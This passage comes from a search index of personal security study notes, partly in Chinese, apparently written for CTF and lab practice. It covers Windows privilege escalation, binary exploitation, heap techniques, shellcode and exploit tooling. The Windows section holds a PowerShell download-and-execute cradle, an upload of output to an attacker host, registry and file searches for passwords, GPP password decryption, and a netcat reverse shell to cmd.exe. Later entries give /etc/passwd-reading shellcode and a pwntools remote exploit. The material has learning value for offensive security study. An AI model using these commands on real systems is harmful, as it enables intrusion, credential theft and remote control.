permissions per drive. C:\\&gt; accesschk.exe -uwdqs Users c:\\ C:\\&gt; accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\\ # Find all weak file permissions per drive. C:\\&gt; accesschk.exe -uwqs Users c:\\*.* C:\\&gt; accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\\*.* cacls PsExec \u62ff\u5230\u67d0\u500b\u5e33\u865f\u7684\u6b0a\u9650(\u6e2c\u8a66\u7528) \u7528\u9ad8\u6b0a\u9650\u7684 shell \u57f7\u884c .\\PsExec64.exe -i -u &quot;nt authority\\local service&quot; cmd.exe JuicyPotato whoami \/priv have SeImpersonate and\/or SeAssignPrimaryToken enable Windows Server 2019 is not affected by this vulnerability. Other versions of Windows (Server 2008R2, Server 2012, Server 2012 R2, Server 2016) are affected. Information Gathering Scripts PowerSploit\/Privesc GitHub cp \/usr\/share\/windows-resources\/powersploit\/Privesc\/PowerUp.ps1 . PS C:\\Windows\\system32&gt; IEX(New-Object Net.WebClient).downloadString(&quot;http:\/\/10.10.14.42\/PowerUp.ps1&quot;) PS C:\\Windows\\system32&gt; Invoke-AllChecks Windows Management Instrumentation Command-Line Invoke-WebRequest -Uri &quot;http:\/\/10.10.14.42\/wmic_info.bat&quot; -OutFile wmic_info.bat .\\wmic_info.bat Invoke-WebRequest -uri &quot;http:\/\/10.10.14.42\/out.html&quot; -Method Put -Infile &quot;.\\out.html&quot; -ContentType 'text\/plain' Manual OS C:\\Windows\\system32&gt; systeminfo | findstr \/B \/C:&quot;OS Name&quot; \/C:&quot;OS Version&quot; users and permissions C:\\Windows\\system32&gt; hostname C:\\Windows\\system32&gt; whoami C:\\Windows\\system32&gt; net users C:\\Windows\\system32&gt; net user {{username}} # list of administrators C:\\Windows\\system32&gt; net localgroup administrators network interfaces &amp; routing table &amp; firewall C:\\Windows\\system32&gt; ipconfig \/all C:\\Windows\\system32&gt; route print C:\\Windows\\system32&gt; arp -A C:\\Windows\\system32&gt; netstat -ano C:\\Windows\\system32&gt; netsh firewall show state C:\\Windows\\system32&gt; netsh firewall show config scheduled tasks, running processes, started services and installed drivers. C:\\Windows\\system32&gt; schtasks \/query \/fo LIST \/v # scheduled tasks C:\\Windows\\system32&gt; tasklist \/SVC # running processes C:\\Windows\\system32&gt; net start # started services C:\\Windows\\system32&gt; DRIVERQUERY # installed drivers last # The command below will search the file system for file names containing certain keywords. # You can specify as many keywords as you wish. C:\\Windows\\system32&gt; dir \/s *pass* == *cred* == *vnc* == *.config* # Search certain file types for a keyword, this can generate a lot of output. C:\\Windows\\system32&gt; findstr \/si password *.xml *.ini *.txt # Similarly the two commands below can be used to grep the registry for keywords, in this case &quot;password&quot;. C:\\Windows\\system32&gt; reg query HKLM \/f password \/t REG_SZ \/s C:\\Windows\\system32&gt; reg query HKCU \/f password \/t REG_SZ \/s Privilege Escalation kernel \u6f0f\u6d1e C:\\Windows\\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr \/C:&quot;KB..&quot; \/C:&quot;KB..&quot; KiTrap0D (KB979682) MS11-011 (KB2393802) MS10-059 (KB982799) MS10-021 (KB979683) MS11-080 (KB2592799) sysprep \/ Unattend c:\\sysprep.inf c:\\sysprep\\sysprep.xml %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml # This is a sample from sysprep.inf with clear-text credentials. [GuiUnattended] OEMSkipRegional=1 OemSkipWelcome=1 AdminPassword=s3cr3tp4ssw0rd TimeZone=20 # This is a sample from sysprep.xml with Base64 &quot;encoded&quot; credentials. Please people Base64 is not encryption, I take more precautions to protect my coffee. The password here is &quot;SuperSecurePassword&quot;. &lt;LocalAccounts&gt; &lt;LocalAccount wcm:action=&quot;add&quot;&gt; &lt;Password&gt; &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;\/Value&gt; &lt;PlainText&gt;false&lt;\/PlainText&gt; &lt;\/Password&gt; &lt;Description&gt;Local Administrator&lt;\/Description&gt; &lt;DisplayName&gt;Administrator&lt;\/DisplayName&gt; &lt;Group&gt;Administrators&lt;\/Group&gt; &lt;Name&gt;Administrator&lt;\/Name&gt; &lt;\/LocalAccount&gt; &lt;\/LocalAccounts&gt; # Sample from Unattended.xml with the same &quot;secure&quot; Base64 encoding. &lt;AutoLogon&gt; &lt;Password&gt; &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;\/Value&gt; &lt;PlainText&gt;false&lt;\/PlainText&gt; &lt;\/Password&gt; &lt;Enabled&gt;true&lt;\/Enabled&gt; &lt;Username&gt;Administrator&lt;\/Username&gt; &lt;\/AutoLogon&gt; Groups.xml - Group Policy Preference saved passwords The AES Key 4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8 f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b PS C:\\Programdata&gt; cmd.exe \/c &quot;dir \/s \/b | findstr Groups.xml&quot; C:\\Programdata\\Microsoft\\Group Policy\\History\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xml PS C:\\Programdata&gt; Get-Content &quot;C:\\Programdata\\Microsoft\\Group Policy\\History\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xml&quot; &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt; &lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;Administrator&quot; image=&quot;2&quot; changed=&quot;2019-01-28 23:12:48&quot; uid=&quot;{CD450F70-CDB8-4948-B908-F8D038C59B6C}&quot; userContext=&quot;0&quot; removePolicy=&quot;0&quot; policyApplied=&quot;1&quot;&gt; &lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;CiDUq6tbrBL1m\/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1\/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ&quot; changeLogon=&quot;0&quot; noChange=&quot;0&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;Administrator&quot;&gt;&lt;\/Properties&gt;&lt;\/User&gt;&lt;\/Groups&gt; python Gpprefdecrypt.py CiDUq6tbrBL1m\/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1\/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ MyUnclesAreMarioAndLuigi!!1! In addition to Groups.xml several other policy preference files can have the optional \u201ccPassword\u201d attribute set: Services\\Services.xml: Element-Specific Attributes ScheduledTasks\\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element Printers\\Printers.xml: SharedPrinter Element Drives\\Drives.xml: Element-Specific Attributes DataSources\\DataSources.xml: Element-Specific Attributes AlwaysInstallElevated AlwaysInstallElevated - \u5141\u8a31\u6240\u6709\u6b0a\u9650\u7684\u4f7f\u7528\u8005\u5b89\u88dd *.msi \u6210\u70ba NT AUTHORITY\\SYSTEM \u5169\u500b\u503c\u90fd\u8981\u662f1 C:\\Windows\\system32&gt; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated C:\\Windows\\system32&gt; reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated DLL DLL search order on 32-bit systems: The directory from which the application loaded 32-bit System directory (C:\\Windows\\System32) 16-bit System directory (C:\\Windows\\System) Windows directory (C:\\Windows) The current working directory (CWD) - \u5982\u679c\u662f Windows Service \u6703\u5728 C:\\Windows \u4e2d Directories in the PATH environment variable (system then user) msfvenom -f DLL Command Injection pingback check generate pingback payload $ echo &quot;ping -n 1 10.10.14.5&quot; | iconv -t utf-16le | base64 -w 0 cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA1AAoA# &gt; powershell -EncodedCommand cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA1AAoA ensure pingback $ tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes 18:01:08.824794 IP servmon.htb &gt; kali-workplace: ICMP echo request, id 1, seq 1, length 40 18:01:08.824806 IP kali-workplace &gt; servmon.htb: ICMP echo reply, id 1, seq 1, length 40 nc $ mkdir www &amp;&amp; cd www $ cp \/usr\/share\/windows-resources\/binaries\/nc.exe . $ python3 -m http.server 7001 &gt; curl 10.10.14.5:7001\/nc.exe &gt; nc.exe &gt; echo C:\\Temp\\nc.exe 10.10.14.5 7777 -e cmd.exe &gt; reverse.bat","tags":"","url":"Privilege_Escalation\/Windows.html"},{"title":"Misc","text":"Binary Exploitation Misc Table of Contents Binary Exploitation Misc tags: Security PWN Online Resouces Tricks create program create 32 bit program using GCC remove symbol Debug LD_PRELOAD remove alarm (for debugging) Information Leak No null byte about stack hooks Knowledge Not Aligned stack broken the process Trouble Shooting run 32-bit program on a 64-bit system and get error message \u201cno such file or directory\u201d Tools ncat socat ldd strace ltrace hexdump readelf objdump gcc Seccomp Tools pwntools OneGadget ROPgadget ctypes remoterand tags: Security PWN Online Resouces Angelboy Tricks create program create 32 bit program using GCC apt-get install g++-multilib gcc -m32 hello.c remove symbol strip hello Debug LD_PRELOAD \u81ea\u88fd library \u53d6\u4ee3\u52d5\u614b\u806f\u7d50 \/\/main.c #include &lt;stdio.h&gt; #include &lt;math.h&gt; int main() { dobule x; scanf(&quot;%lf&quot;, &amp;x); printf(&quot;%f\\n&quot;, sqrt(x)); return 0; } \/\/hook.c double sqrt(double x) { return 2; } $ gcc -o main main.c -lm \/\/-m32 to build 32-bit program $ gcc -o hook.so -shared hook.c \/\/-fPIC $ LD_PRELOAD=.\/hook.so .\/main remove alarm (for debugging) vim .\/printable alarm =&gt; isnan s\/alarm\/isnan\/g Information Leak No null byte about stack \u5728 stack \u4e0a\u9762\u627e\u6709\u6c92\u6709\u4e00\u500b\u4e0d\u932f\u7684 pointer (\u5dee\u5c0f\u65bc1, 2 bytes) \u53ef\u4ee5\u6307\u5230 printf \u7684 return address \u627e\u770b\u770b data \u6bb5\u7684 60 \u958b\u982d\u5728 program \u88e1\u7684 data or rawdata hooks glibc \u4e2d\u5b58\u5728\u8a31\u591a function hooks\uff0c\u5728\u653b\u64ca\u6642\u5982\u679c\u80fd\u9054\u5230 arbitrary write \u6216\u4efb\u610f\u5beb\uff0c hooks \u6703\u662f\u4e00\u500b\u5f88\u597d\u7684\u5beb\u5165\u76ee\u6a19\uff0c\uf92d\u505a\u5230 control flow \u5728\u57f7\u884c\u8a72 function \u6642\uff0c\u767c\u73fe\u8a72 function hook \u6709\u503c\uff0c\u5247\u7576\u4f5c function pointer \u8df3\u4e0a\u53bb\u57f7\u884c void * __libc_malloc (size_t bytes) { mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); ... } Knowledge Not Aligned stack broken the process MOVAPS \u2014 Move Aligned Packed Single-Precision Floating-Point Values Trouble Shooting run 32-bit program on a 64-bit system and get error message \u201cno such file or directory\u201d dpkg --add-architecture i386 apt-get update apt-get install libc6:i386 Tools ncat nc -kl -n -v 8888 -e .\/a.out nc -kl -n -v 7777 --sh-exec &quot;ltrace -l .\/libc-2.27.so -x @ .\/whitehole&quot; nc -kl -n -v 7777 --sh-exec &quot;ltrace -S -l .\/libc-2.27.so .\/whitehole&quot; socat socat tcp-listen:12398 exec:.\/a.out ldd print shared object dependencies(dynamically linked binaries) maping \u4f4d\u7f6e ldd read libary strace trace system calls \u986f\u793asyscall strace .\/printable ltrace trace library calls hexdump readelf readelf -l a.out readelf -aW libc | grep atexit readelf -S \u8b80 section header readelf -r a.out read got objdump objdump -f a.out objdump -T \/lib\/x86_64-linux-gnu\/libc.so.6 | grep puts \u627e offset \u6211\u5011\u53ef\u5229\u7528 objdump -T libc.so.6 | grep function \u4f86\u627e\u5c0b\u60f3\u627e\u7684 function \u5728libc \u4e2d\u7684 offset objdump -R .\/bof GOT Table gcc Seccomp Tools GitHub pwntools GitHub OneGadget GitHub ROPgadget GitHub ctypes can use it to call C library from ctypes import * libc = CDLL('libc.so.6') print(libc.rand()) libc.printf(b'%d %d\\n',1 ,2) remoterand Q: #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;time.h&gt; int main() { int x; srand(time(NULL)); setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); scanf(&quot;%d&quot;, &amp;x); if(rand() == x) puts(&quot;You get it!&quot;); return 0; } solve: from pwn import * from ctypes import * context.update(arch=&quot;amd64&quot;, os=&quot;linux&quot;) libc = CDLL(&quot;libc.so.6&quot;) r = remote(&quot;140.113.216.190&quot;, 30004) libc.srand(libc.time(0)) r.sendline(str(libc.rand())) print(r.recv())","tags":"","url":"Binary_Exploitation\/Misc.html"},{"title":"Linux-Basic","text":"Binary Exploitation - Linux - Basic Table of Contents Binary Exploitation - Linux - Basic tags: Security PWN Online Resources Vulnerability Stack Overflow Fuzzing Format String GOT Hijacking Return Oriented Programming ret2shellcode ROP gadget ret2plt ret2libc OneGadget Return to dl-resolve ret2csu Sigreturn Oriented Programming Return to vDSO Stack Pivoting (Stack Migration) tags: Security PWN Online Resources Angelboy\/stack overflow Angelboy\/ROP Angelboy\/Sigreturn Oriented Programming Angelboy\/Return to dl-resolve Vulnerability Stack Overflow Fuzzing \u5982\u679c\u4e00\u6b21\u585e\u592a\u591a overflow \u53ef\u80fd\u6703\u9020\u6210\u4e0d\u5728\u9810\u671f\u7684\u7d50\u679c\uff0c\u9084\u662f\u8981\u6f38\u9032\u5f0f\u7684\u628a overflow \u7684\u6578\u91cf\u52a0\u4e0a\u53bb\u3002 Format String GOT Hijacking Return Oriented Programming ret2shellcode ROP gadget ret2plt ret2libc OneGadget Return to dl-resolve ret2csu \u4f4d\u65bc __libc_csu_init \uff0c\u5c3e\u7aef\u6709\u4e00\u6bb5\u5f88\u597d\u7528\u7684 gadget \u900f\u904e\u63a7\u5236 rbp rbx r12 r13 r14 r15 registers \u7684\u503c\uff0c\u8df3\u81f3 gadget \u958b\u982d\uff0c r13 r14 r15\uff0c\u5206\u5225\u653e\u7f6e\u524d\u4e09\u500b\uf96b\u6578 rdi rsi rdx\uff0c\u6b64\u90e8\u5206\u89e3\u6c7a\uf9ba\u5f88\u5c11\u627e\u5230 pop rdx gadget\uff0c ROP \u5f88\u96e3\u63a7\u5236\u7b2c\u4e09\u500b\uf96b\u6578\u7684\u554f\u984c \u63a7\u5236 r12 rbx \uf92d\u6307\u5b9a\u4efb\u610f\u8a18\u61b6\u9ad4\u4f4d\u7f6e call [r12+rbx*8] \u5c07 rbx \u8a2d\u70ba 0\uff0c\u5c07 rbp \u8a2d\u70ba 1\uff0c\u5728 call \u5b8c\u5f8c\u4f7f rbx == rbp == 1\uff0c jne \u4e0d\u6703 take\uff0c\u800c\u7e7c\u7e8c\u57f7\u2f8f\ufa08\u5f8c\u9762\u7684\u9023\u7e8c pop register\uff0c\u5982\u6b64\u53ef\u91cd\u8907\u4f7f\u7528\uff0c\u9054\u5230\u4efb\u610f ROP Sigreturn Oriented Programming Return to vDSO Stack Pivoting (Stack Migration)","tags":"","url":"Binary_Exploitation\/Linux_Basic.html"},{"title":"Linux-Heap","text":"Binary Exploitation - Linux - Heap Table of Contents Binary Exploitation - Linux - Heap tags: Security PWN Online Resources Mechanism Detection in Glibc Use after free Fastbin corruption (Fastbin attack) Overflow knowledge: Unlink Malloc Maleficarum The House of Spirit Overwrite Fastbin The House of Force Tcache Tricks hooks Overlap Shrink the chunk Extend the chunk Unsorted bin attack tags: Security PWN Online Resources shellphish\/how2heap Angelboy\/Tcache Angelboy\/Heap Angelboy\/Advanced Heap Mechanism Detection in Glibc Use after free Fastbin corruption (Fastbin attack) Overflow \u901a\u5e38\u7121\u6cd5\u76f4\u63a5\u63a7\u5236 eip \u4f46\u53ef\u4ee5\u5229\u7528\u84cb\u4e0b\u4e00\u500b chunk header\uff0c\u518d\u5229\u7528 malloc \u6216 free \u7684\u884c\u70ba\u9054\u6210\u4efb\u610f\u4f4d\u7f6e\u5beb\u5165\uff0c\u6700\u5f8c\u63a7\u5236 eip knowledge: Unlink Malloc Maleficarum The House of Spirit Overwrite Fastbin The House of Force Tcache Tricks hooks __malloc_hook __free_hook __realloc_hook Overlap Shrink the chunk Extend the chunk Unsorted bin attack","tags":"","url":"Binary_Exploitation\/Linux_Heap.html"},{"title":"Stack Frame & Calling Convention","text":"Stack Frame &amp; Calling Convention Table of Contents Stack Frame &amp; Calling Convention tags: Security PWN Stack Frame Basic Stack Calling Convention how to pass array argument on the stack Unix\/Linux Calling Convention Kernel Interface x86-32 aka i386 Linux System Call convention x86-32 [Free|Open|Net|DragonFly]BSD UNIX System Call convention: x86-64 Linux System Call convention User Interface: function calling x86-32 Function Calling convention x86-64 System V user-space Function Calling convention Microsoft Calling Convention __stdcall (link) __cdecl (link) Microsoft x64 calling convention tags: Security PWN Stack Frame Basic Stack Calling Convention how to pass array argument on the stack dca0 dca8\u5206\u5225\u6307\u5411\u9663\u5217\u7684\u5169\u500b\u503c \u6ce8\u610f0x0\u7d50\u5c3e (\u4e0d\u78ba\u5b9a\u662f\u4e0d\u662f\u5fc5\u8981) \u5047\u5982\u6b64\u53c3\u6578\u662f\u7531rdx\u50b3\u9001 \u5247 mov rdx, 0x7fffffffdca0 Unix\/Linux Calling Convention UNIX &amp; Linux calling convention on i386 and x86-64 Kernel Interface x86-32 aka i386 Linux System Call convention x86-32 [Free|Open|Net|DragonFly]BSD UNIX System Call convention: x86-64 Linux System Call convention User Interface: function calling x86-32 Function Calling convention x86-64 System V user-space Function Calling convention Once arguments are classified, the registers get assigned (in left-to-right order) for passing as follows: If the class is MEMORY, pass the argument on the stack. If the class is INTEGER, the next available register of the sequence %rdi, %rsi, %rdx, %rcx, %r8 and %r9 is used Microsoft Calling Convention __stdcall (link) The __stdcall calling convention is used to call Win32 API functions __cdecl (link) __cdecl is the default calling convention for C and C++ programs Microsoft x64 calling convention","tags":"","url":"Binary_Exploitation\/Stack_Frame_Calling_Convention.html"},{"title":"ELF (Executable and Linkable Format)","text":"ELF (Executable and Linkable Format) Table of Contents ELF (Executable and Linkable Format) tags: Security PWN Online Resources Workflow Static library Dynamic linking library Section Protections PIE - Position-Independent Executable NX - No-eXecute Canary - stack protector RELRO - Relocation Read-Only Other FORTIFY Lazy Binding tags: Security PWN Online Resources Angelboy\/basic knowledge Workflow Static library Dynamic linking library Section .bss - \u5b58\u653e\u672a\u521d\u59cb\u5316\u503c\u7684\u5168\u57df\u8b8a\u6578 (global variable) .data - \u5b58\u653e\u5177\u521d\u59cb\u5316\u503c\u7684\u5168\u57df\u8b8a\u6578 .rodata - \u5b58\u653e\u552f\u8b80 (read-only) \u8cc7\u6599 .text - \u5b58\u653e\u7de8\u8b6f\u5f8c\u7684 code Protections PIE - Position-Independent Executable turn off protection (choose one) -no-pie sudo -s echo 0 &gt; \/proc\/sys\/kernel\/randomize_va_space (ASLR) NX - No-eXecute turn off protection -z execstack Canary - stack protector turn off protection gcc -fno-stack-protector \/\/disable gcc -fstack-protector \/\/partly enable gcc -fstack-protector-all \/\/enable RELRO - Relocation Read-Only turn off protection -z norelro In partial RELRO the non-PLT part of the GOT section (.got from readelf output) is read only .got.plt is still writeable. In complete RELRO the entire GOT (.got and .got.plt both) is marked as read-only. Other FORTIFY gcc -D_FORTIFY_SOURCE=1 adds checks at compile-time only (some headers are necessary as #include &lt;string.h&gt;) gcc -D_FORTIFY_SOURCE=2 also adds checks at run-time (detected buffer overflow terminates the program) turn off protection -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=2 Lazy Binding 0x601010: 0x00007ffff7dee870 puts_got 0x601018: 0x0000000000400586 call 0x400580 \\&lt;puts@plt&gt; 0x400580 \\&lt;puts@plt&gt;: jmp QWORD PTR [rip+0x200a92] # [0x601018] 0x400586 \\&lt;puts@plt+6&gt;: push 0x0 0x40058b \\&lt;puts@plt+11&gt;: jmp 0x400570 0x400570: push QWORD PTR [rip+0x200a92] # [0x601008] 0x400576: jmp QWORD PTR [rip+0x200a94] # [0x601010] 0x7ffff7dee870 &lt;_dl_runtime_resolve_avx&gt;: push rbx 0x601010: 0x00007ffff7dee870 puts_got 0x601018: 0x00007ffff7a7c690 .got .got.plt","tags":"","url":"Binary_Exploitation\/ELF_(Executable_and_Linkable_Format).html"},{"title":"PE (Portable Executable format)","text":"PE (Portable Executable format) Table of Contents PE (Portable Executable format) tags: Security PWN ReverseEngineering Reference Softwares PEview PE-bear CFF Explorer knowledge Special Sections COFF file IMAGE_FILE_HEADER IMAGE_SECTION_HEADER PE file Optional Header Win32 Process PEB\/TEB(TIB) Structured Exception Handling tags: Security PWN ReverseEngineering Reference NTU-Computer-Security-2019-Fall Softwares PEview \u8b80 32-bit PE \/ COFF file \u7684\u7d50\u69cb\u548c\u5167\u5bb9 PE-bear CFF Explorer knowledge Special Sections .text: Code .data: Initialized data .bss: Uninitialized data .rdata: Const\/read-only (and initialized) data .edata: Export descriptors .idata: Import descriptors .reloc: Relocation table (for code instructions with absolute addressing when the module could not be loaded at its preferred base address) .rsrc: Resources (icon, bitmap, dialog, \u2026) .tls: __declspec(thread) data (Fails with dynamically loaded DLLs -&gt; hard to find bugs) COFF file IMAGE_FILE_HEADER \u5f8c\u6703\u63a5\u8457\u4e00\u9023\u4e32\u7684 IMAGE_SECTION_HEADER IMAGE_FILE_HEADER IMAGE_FILE_HEADER \u6703\u6a19\u660e section \u7684\u6578\u91cf IMAGE_SECTION_HEADER PE file Optional Header Win32 Process PEB\/TEB(TIB) \u6700\u5927\u7684\u7528\u8655\u5728\u65bc\u5132\u5b58\u95dc\u65bc process \u672c\u8eab\u7684\u8cc7\u8a0a\uff0c\u8b93 process \u53ef\u4ee5\u4e0d\u547c\u53eb Win32 API Structured Exception Handling SEH is a feature to support try{} catch (...) {} Vectored exception handling is an extension to structured exception handling \u9700\u8981\u5728 visual studio \u555f\u7528\u8a2d\u5b9a","tags":"","url":"Binary_Exploitation\/PE_(Portable_Executable_format).html"},{"title":"Linux-FILE Structure","text":"","tags":"","url":"Binary_Exploitation\/Linux_FILE_Structure.html"},{"title":"System Call & Shellcode","text":"System Call &amp; Shellcode Table of Contents System Call &amp; Shellcode tags: Security PWN Online Resources System call table Shellcode Manual Assembly amd64 Write i386 ORW create shellcode pwntools test shellcode msfvenom Windows shellcode tags: Security PWN Online Resources exsited shellcode System call table x86 linux system call table, x86 linux system call table x64 linux system call table, x64 linux system call table Shellcode Manual Assembly amd64 Write global _start section .text _start: xor rax, rax xor rbx, rbx xor rcx, rcx xor rdx, rdx jmp str write: mov rax, 1 inc rdi pop rsi mov rdx, 12 syscall mov rax,60 syscall str: call write db 'Hello world', 0 nasm -f elf64 -o main.o main.asm ld -m elf_x86_64 main.o -o main i386 ORW ; main.asm global _start _start: ;open(&quot;\/etc\/passwd&quot;, 0); ;hex(u32(b&quot;\/etc&quot;)) =&gt; 0x6374652f ;Put the system call sys_open() number 5, in the EAX register. ;Put the filename in the EBX register. ;Put the file access mode in the ECX register. ;Access mode : read-only (0), write-only (1), and read-write (2). ;Put the file permissions in the EDX register. push 0x00647773 push 0x7361702f push 0x6374652f mov ebx, esp mov ecx, 0 mov edx, 0 mov eax, 5 int 0x80 ;The system call returns the file descriptor of the created file in the EAX register, in case of error, the error code is in the EAX register. ; read(fd, buf, sizeof(buf)); ; Put the system call sys_read() number 3, in the EAX register. ; Put the file descriptor in the EBX register. ; Put the pointer to the input buffer in the ECX register. ; Put the buffer size, i.e., the number of bytes to read, in the EDX register. mov ebx, eax mov ecx, esp mov edx, 10000 mov eax, 3 int 0x80 ; The system call returns the number of bytes read in the EAX register, in case of error, the error code is in the EAX register. ; write(1, buf, len); ; Put the system call sys_write() number 4, in the EAX register. ; Put the file descriptor in the EBX register. ; Put the pointer to the output buffer in the ECX register. ; Put the buffer size, i.e., the number of bytes to write, in the EDX register. mov ebx, 1 ; File descriptor for standard output mov ecx, esp mov edx, eax mov eax, 4 int 0x80 ; The system call returns the actual number of bytes written in the EAX register, in case of error, the error code is in the EAX register. ; ==&gt; exit(0); mov eax, 1 mov ebx, 0 int 0x80 $ nasm -f elf32 -o main.o main.asm $ yasm -f elf32 -o main.o main.asm $ ld -m elf_i386 -o main main.o create shellcode pwntools from pwn import * context.arch = \"amd64\" context.os = \"linux\" context.log_level = \"DEBUG\" shellcode_asm = \"\"\" push 0x00647773 push 0x7361702f push 0x6374652f mov ebx, esp mov ecx, 0 mov edx, 0 mov eax, 5 int 0x80 mov ebx, eax mov ecx, esp mov edx, 10000 mov eax, 3 int 0x80 mov ebx, 1 mov ecx, esp mov edx, eax mov eax, 4 int 0x80 mov eax, 1 mov ebx, 0 int 0x80 \"\"\" log.info(asm(shellcode_asm)) output [DEBUG] cpp -C -nostdinc -undef -P -I\/usr\/local\/lib\/python3.7\/dist-packages\/pwnlib\/data\/includes \/dev\/stdin [DEBUG] Assembling .section .shellcode,&quot;awx&quot; .global _start .global __start _start: __start: .intel_syntax noprefix push 0x00647773 push 0x7361702f push 0x6374652f mov ebx, esp mov ecx, 0 mov edx, 0 mov eax, 5 int 0x80 mov ebx, eax mov ecx, esp mov edx, 10000 mov eax, 3 int 0x80 mov ebx, 1 mov ecx, esp mov edx, eax mov eax, 4 int 0x80 mov eax, 1 mov ebx, 0 int 0x80 [DEBUG] \/usr\/bin\/x86_64-linux-gnu-as -64 -o \/tmp\/pwn-asm-q7affql_\/step2 \/tmp\/pwn-asm-q7affql_\/step1 [DEBUG] \/usr\/bin\/x86_64-linux-gnu-objcopy -j .shellcode -Obinary \/tmp\/pwn-asm-q7affql_\/step3 \/tmp\/pwn-asm-q7affql_\/step4 [*] b&quot;hswd\\x00h\/pash\/etc\\x89\\xe3\\xb9\\x00\\x00\\x00\\x00\\xba\\x00\\x00\\x00\\x00\\xb8\\x05\\x00\\x00\\x00\\xcd\\x80\\x89\\xc3\\x89\\xe1\\xba\\x10'\\x00\\x00\\xb8\\x03\\x00\\x00\\x00\\xcd\\x80\\xbb\\x01\\x00\\x00\\x00\\x89\\xe1\\x89\\xc2\\xb8\\x04\\x00\\x00\\x00\\xcd\\x80\\xb8\\x01\\x00\\x00\\x00\\xbb\\x00\\x00\\x00\\x00\\xcd\\x80&quot; from pwn import * context.update(arch='i386', os='linux') code = ''' push 0x61616161 mov eax, 4 mov ebx, 1 mov ecx, esp mov edx, 4 int 0x80 mov eax, 1 mov ebx, 0 int 0x80''' print(repr(asm(code))) test shellcode char *ptr = &quot;haaaa\\xb8\\x04\\x00\\x00\\x00\\xbb\\x01\\x00\\x00\\x00\\x89\\xe1\\xba\\x04\\x00\\x00\\x00\\xcd\\x80\\xb8\\x01\\x00\\x00\\x00\\xbb\\x00\\x00\\x00\\x00\\xcd\\x80&quot;; int main() { void (*f)() = (void (*)()) ptr; f(); return 0; } gcc -m32 test_shellcode.c -o shell -z execstack msfvenom Metasploit note Windows shellcode Basics of Windows shellcode writing","tags":"","url":"Binary_Exploitation\/System_Call_Shellcode.html"},{"title":"Windows-Heap","text":"","tags":"","url":"Binary_Exploitation\/Windows_Heap.html"},{"title":"OSX-Heap","text":"","tags":"","url":"Binary_Exploitation\/OSX_Heap.html"},{"title":"C++","text":"","tags":"","url":"Binary_Exploitation\/C++.html"},{"title":"Tools-Pwntools","text":"Pwntools Table of Contents Pwntools tags: Security Tools Installation methods asm p u user interaction pause utils cyclic - Generation of unique sequences tags: Security Tools cyclic : aaaabaaacaaadaaa Installation sudo apt-get update sudo apt-get install python3 python3-dev python3-pip git libssl-dev libffi-dev sudo pip3 install --upgrade git+https:\/\/github.com\/Gallopsled\/pwntools.git@dev3 sudo pip3 install --upgrade git+https:\/\/github.com\/arthaud\/python3-pwntools.git # no longer support methods asm &gt;&gt;&gt; asm('mov eax, 0') '\\xb8\\x00\\x00\\x00\\x00' &gt;&gt;&gt; asm(shellcraft.nop()) '\\x90' &gt;&gt;&gt; disasm('\\xb8\\x0b\\x00\\x00\\x00') ' 0: b8 0b 00 00 00 mov eax,0xb' p &gt;&gt;&gt; p8(0) '\\x00' &gt;&gt;&gt; p32(0xdeadbeef) '\\xef\\xbe\\xad\\xde' &gt;&gt;&gt; p32(0xdeadbeef, endian='big') '\\xde\\xad\\xbe\\xef' &gt;&gt;&gt; with context.local(endian='big'): p32(0xdeadbeef) '\\xde\\xad\\xbe\\xef' u &gt;&gt;&gt; hex(u32(b&quot;\/bin&quot;)) '0x6e69622f' &gt;&gt;&gt; hex(u64(b&quot;\/\/bin\/sh&quot;)) '0x68732f6e69622f2f' user interaction pause utils cyclic - Generation of unique sequences cyclic(16) 'aaaabaaacaaadaaa' cyclic_find('baaa') 4","tags":"","url":"Binary_Exploitation\/Tools_Pwntools.html"},{"title":"Tools-IDA Pro","text":"IDA Pro Table of Contents IDA Pro tags: Security Tools Shortcut tags: Security Tools Shortcut n:\u5e6b\u7269\u4ef6\u53d6\u540d\u5b57 y:\u8a2d\u5b9a\u7269\u4ef6\u7684\u985e\u578b g:\u8df3\u5230\u6307\u5b9a\u4f4d\u5740 x:\u627e reference(\u627e\u51fa\u90a3\u88e1\u7528\u5230\u9019\u500b\u7269\u4ef6) Alt-B:\u627e bytes Shfit-F12:\u5b57\u4e32\u5217\u8868 